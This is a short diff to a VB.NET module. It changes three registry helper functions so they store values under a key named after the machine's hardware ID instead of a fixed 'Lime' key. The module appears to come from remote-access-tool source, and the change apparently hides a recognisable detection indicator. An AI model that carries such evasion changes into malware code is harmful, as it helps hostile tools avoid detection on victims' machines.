@@ -14,14 +14,14 @@ Module Func
 
     Function DLV(ByVal n As String) ' delete value in my Registry Key RG
         Try
-            Registry.CurrentUser.CreateSubKey("Software\" & "Lime").DeleteValue(n)
+            Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).DeleteValue(n)
         Catch ex As Exception
         End Try
     End Function
 
     Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
         Try
-            Return Registry.CurrentUser.CreateSubKey("Software\" & "Lime").GetValue(n, "")
+            Return Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).GetValue(n, "")
         Catch ex As Exception
             Return ""
         End Try
@@ -29,7 +29,7 @@ Module Func
 
     Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
         Try
-            Registry.CurrentUser.CreateSubKey("Software\" & "Lime").SetValue(n, t)
+            Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).SetValue(n, t)
             Return True
         Catch ex As Exception
             Return False
